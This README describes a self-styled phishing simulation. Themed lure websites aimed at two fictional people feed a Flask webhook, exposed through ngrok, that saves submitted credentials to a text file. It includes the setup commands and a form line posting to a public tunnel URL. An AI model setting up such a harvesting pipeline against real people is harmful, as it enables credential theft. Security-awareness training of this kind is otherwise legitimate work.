
## Phishing Simulation Project

This project involves setting up themed websites for two fictional characters, Bob (dog lover) and Alice (car enthusiast), and capturing submitted credentials via a Flask webhook.


### Project Structure
```plaintext
Phishing.project/
├── bob_site/ (Dog-themed website)
├── alice_site/ (Car-themed website)
├── webhook_server/ (Flask server to capture data)
└── README.md
```

## **Setup Instructions**

### **1. Prerequisites**
- Python 3.6+
- Flask
- Ngrok


   ```
### Steps

1. **Run the Webhook Server**
   ```bash
   cd webhook_server
   python webhook.py
   ```

2. **Expose Local Server Using Ngrok**
   ```bash
   ngrok http 5000
   ```
   Update the form `action` in `index.html` with the Ngrok public URL:
   ```html
   <form action="http://your-ngrok-url/webhook" method="POST">
   ```

3. **Serve the Websites**
   ```bash
   cd bob_site
   python -m http.server 8080
   ```
   Visit `http://127.0.0.1:8080` in your browser.

4. **Test and Capture Credentials**
   Submit test credentials on the websites. Captured credentials will be saved in `credentials.txt`.


### **5. Test the Setup**

1. Open the website in a browser.
2. Enter test credentials and submit the form.
3. Check the `credentials.txt` file in the `webhook_server` directory for captured credentials.

---

## **Troubleshooting**

### Common Issues

#### 1. **404 Error on `/webhook` Route**
- Ensure the form’s `action` URL matches the Flask route (`/webhook`).
- Verify Flask is running and listening on port 5000.

#### 2. **`credentials.txt` Not Updated**
- Confirm `webhook.py` has permission to write to `credentials.txt`.
- Manually create an empty `credentials.txt` file in the `webhook_server` directory and ensure it is writable.

---

## **Project Components**

### Flask Webhook Server (`webhook.py`)
- Captures form data and writes credentials to `credentials.txt`.

### Bob’s and Alice’s Websites
- Custom HTML and CSS themes designed to appeal to each target.

---


